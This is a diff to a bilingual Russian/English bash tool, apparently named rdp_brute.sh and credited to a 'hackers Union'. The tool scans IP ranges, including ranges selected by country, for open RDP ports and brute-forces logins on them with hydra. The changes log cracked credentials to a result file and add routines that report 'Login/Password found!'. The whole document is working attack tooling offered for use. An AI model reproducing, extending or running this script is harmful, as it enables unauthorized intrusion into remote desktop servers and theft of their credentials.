@@ -38,7 +38,7 @@ clear
 echo -e       "$grey                     +-------------------------------------+"
 echo -e       "$grey                     |            Auto  Script             |"
 echo -e "$aquamarine                     |    by GetDrive & hackers Union      |" 
-echo -e        "$red                     |            Version 1.08             |"
+echo -e        "$red                     |            Version 1.09             |"
 echo -e        "$red                     +-------------------------------------+ $colorbase"
 #####################################CHECKLANGUAGE####################################
 CHECKLANGUAGE ()
@@ -283,7 +283,9 @@ read -p "*Укажите путь к файлу со списком пароле
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
+trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+TESTRESULTRU 
 echo -e "\n$red***ОШИБКА! Неверно указан логин или файл с паролями"
 echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
 read -p ""
@@ -299,7 +301,9 @@ read -p "*Введите пароль {administrator, admin, 123456 & etc.} : " 
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
+trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+TESTRESULTRU
 echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или не указан пароль"
 echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
 read -p ""
@@ -315,7 +319,9 @@ read -p "*Укажите путь к файлу со списком пароле
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
+trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+TESTRESULTRU
 echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или файл с паролями"
 echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
 read -p ""
@@ -329,7 +335,11 @@ if [ "$brutmenu" = "4" ]; then
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
+trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+TESTRESULTRU
+
+
 echo -e "\n$red***ОШИБКА! Файл с целями пустой"
 echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
 read -p ""
@@ -366,9 +376,11 @@ read -p "*Enter username {administrator, admin & etc.} : " loginbrute
 read -p "*Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
 
 clear
-echo -e "                                 $green Start bruteforceing"
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+echo -e "                              $green Start bruteforceing"
+echo ""
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+TESTRESULTEN
 echo -e "\n$red***ERROR! Incorrect login or password file"
 echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
 read -p ""
@@ -382,9 +394,11 @@ echo -e "$aquamarine************************************************************
 read -p "*Enter the path to username dictionary {'/home/dictionary/users'}: " loginlist
 read -p "*Enter the password {administrator, admin, 123456 & etc.} : " passbrute
 clear
-echo -e "                                 $green Start bruteforceing"
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+echo -e "                              $green Start bruteforceing"
+echo ""
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+TESTRESULTEN
 echo -e "\n$red***ERROR! Incorrect file with login and password unknown"
 echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
 read -p ""
@@ -398,9 +412,11 @@ echo -e "$aquamarine************************************************************
 read -p "*Enter the path to username dictionary {'/home/dictionary/users'}: " loginlist
 read -p "*Enter the path to passwords dictionary {'/home/dictionary/pass'}: " passlist
 clear
-echo -e "                                 $green Start bruteforceing"
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+echo -e "                              $green Start bruteforceing"
+echo ""
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+TESTRESULTEN
 echo -e "\n$red***ERROR! Incorrect file with logins and passwords file"
 echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
 read -p ""
@@ -411,9 +427,11 @@ fi
 
 if [ "$brutmenu" = "4" ]; then
 clear
-echo -e "                                 $green Start bruteforceing "
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+echo -e "                              $green Start bruteforceing "
+echo ""
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+TESTRESULTEN
 echo -e "\n$red***ERROR! File for targets is empty "
 echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase"
 read -p ""
@@ -10463,7 +10481,7 @@ echo -e "   |        $grey 1.$yellow Scan range to find an open RDP port (manual
 echo -e "   |        $grey 2.$yellow Scan range to find an open RDP port (from a file)$colorbase          | ";
 echo -e "   |        $grey 3.$yellow Bruteforce Username/Password (last scan)$colorbase                   | ";
 echo -e "   |        $grey 4.$yellow Selecting the range of IP for the country $colorbase                 | ";
-echo -e "   |        $grey 5.$yellow Exit ($red[ENTER]$yellow) $colorbase                                            | ";
+echo -e "   |        $grey 5.$yellow Exit ($red ENTER $yellow) $colorbase                                            | ";
 echo -e "   +-----------------------------------------------------------------------+"
 read -p "                              Сhoose from a menu : " menuoption
 
@@ -19869,7 +19887,64 @@ fi
 fi
 }
 ########################################################################################
-
+######################################TESTRESULTRU#######################################
+TESTRESULTRU ()
+{
+if grep -E 'host|login|password' result;
+	then
+	echo ""
+	cat result | grep 'host|login|password'
+	echo ""
+ echo -e "$colorbase                          +---------------------------+"
+ echo -e "$colorbase                          |$red   Логин/Пароль найден!    $colorbase|";
+ echo -e           "                          +---------------------------+$red"
+	echo ""	
+	echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
+read -p ""
+./rdp_brute.sh
+exit;
+./rdp_brute.sh	
+	else
+ echo -e "$colorbase                          +---------------------------+"
+ echo -e "$colorbase                          |$red Логин/Пароль не найден :( $colorbase|";
+ echo -e           "                          +---------------------------+$red"
+ echo -e ""
+ echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
+read -p ""
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi	
+}
+########################################################################################
+######################################TESTRESULTEN######################################
+TESTRESULTEN ()
+{
+if  grep -E 'host|login|password' result 
+	then
+	echo ""
+	cat result | grep 'host|login|password'
+ echo -e "$colorbase                          +-------------------------+"
+ echo -e "$colorbase                          |$red  Login/Password found!  $colorbase|";
+ echo -e           "                          +-------------------------+$red"
+ echo -e ""
+ echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
+read -p ""
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+	else
+ echo -e "$colorbase                          +-----------------------------+"
+ echo -e "$colorbase                          |$red Login/Password not found :( $colorbase|";
+ echo -e           "                          +-----------------------------+$red"
+ echo -e ""
+ echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
+read -p ""
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi	
+}
 #######################################CHECKFILERU######################################
 CHECKFILERU ()
 {
@@ -19881,14 +19956,15 @@ if [ -s open3389 ]
  echo -e "$colorbase                          |$red Открытых RDP не найдено $colorbase|";
  echo -e           "                          +-------------------------+$red"
  echo -e ""
- echo -e "Нажмите$aquamarine ENTER$red для перехода в Главное меню"
+ echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
 read -p ""
 ./rdp_brute.sh
 exit;
 ./rdp_brute.sh
 fi
 }
-######################################################################################
+########################################################################################
+
 #######################################CHECKFILEEN######################################
 CHECKFILEEN ()
 {
@@ -19900,7 +19976,7 @@ if [ -s open3389 ]
  echo -e "$colorbase                          |$red    Open Rdp not found $colorbase  |";
  echo -e           "                          +-------------------------+$red"
  echo -e ""
-echo -e "Press$aquamarine[ENTER]$red to return to the Main menu "
+echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
 read -p ""
 ./rdp_brute.sh
 exit;
